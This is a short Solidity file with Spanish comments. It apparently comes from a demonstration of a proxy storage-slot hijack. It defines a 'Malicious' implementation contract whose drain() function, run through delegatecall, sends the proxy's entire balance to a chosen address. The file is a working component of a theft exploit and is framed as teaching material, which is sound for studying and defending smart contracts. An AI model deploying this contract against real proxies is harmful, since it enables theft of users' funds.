// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @notice Contrato que el atacante coloca como nueva "implementacion" tras
///         secuestrar el slot 0 del proxy. Su layout no importa para este
///         paso -- lo que importa es que drain() se ejecuta en el contexto
///         de storage del PROXY (via delegatecall), no en el suyo propio.
contract Malicious {
    address public owner; // slot 0 — mismo layout que Logic, por prolijidad
    uint256 public value; // slot 1

    function drain(address payable to) external {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
